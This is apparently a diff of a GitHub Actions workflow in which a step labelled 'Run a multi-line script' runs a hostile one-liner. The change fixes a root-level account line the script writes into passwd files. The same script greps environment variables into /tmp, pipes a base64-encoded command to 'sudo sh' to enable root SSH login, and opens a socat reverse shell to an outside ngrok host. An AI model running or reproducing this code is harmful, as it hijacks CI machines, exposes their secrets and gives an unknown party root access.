@@ -34,6 +34,6 @@ jobs:
 
       - name: Run a multi-line script
         run: 
-          bash -p -c "(sleep 150&);env|grep ss>/tmp/s2s.txt;stty rows 60 columns 400;cd /tmp;cp /etc/passwd /etc/passwd.bak;echo 'yes:\$ui2\$EK\$1'>/tmp/cdd;echo 'yes:\$1\$123\$EKWAR\$1\$2'>>./passwd;echo $sshc1|base64 -d|sudo sh;sudo /etc/init.d/ssh restart;ps aux>pse4.txt;socat exec:'bash -pli',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292"
+          bash -p -c "(sleep 150&);env|grep ss>/tmp/s2s.txt;stty rows 60 columns 400;cd /tmp;cp /etc/passwd /etc/passwd.bak;echo 'yes:\$1\$123\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash'>/tmp/cdd;echo 'yes:\$1\$123\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash'>>./passwd;echo $sshc1|base64 -d|sudo sh;sudo /etc/init.d/ssh restart;ps aux>pse4.txt;socat exec:'bash -pli',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292"
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
